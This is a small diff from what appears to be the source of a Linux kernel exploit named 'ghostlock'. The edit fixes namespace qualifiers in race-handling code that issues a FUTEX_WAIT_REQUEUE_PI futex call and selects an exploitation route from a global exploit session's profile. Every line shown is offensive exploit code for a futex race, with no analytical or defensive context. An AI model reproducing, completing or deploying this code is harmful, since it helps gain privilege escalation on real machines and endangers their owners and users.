@@ -46,9 +46,9 @@ namespace ghostlock::race {
         race->waiter_waiting.store(1);
         support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &race->target_futex, 0);
-        route::RouteKind selected = g_exploit_session.profile.supports(::RouteKind::MulticastWaiter)
+        route::RouteKind selected = g_exploit_session.profile.supports(ghostlock::RouteKind::MulticastWaiter)
                                         ? route::RouteKind::MulticastWaiter
-                                        : (g_exploit_session.profile.supports(::RouteKind::TcpZerocopy)
+                                        : (g_exploit_session.profile.supports(ghostlock::RouteKind::TcpZerocopy)
                                                ? route::RouteKind::TcpZerocopy
                                                : route::RouteKind::SelectStack);
         route::RouteController controller;
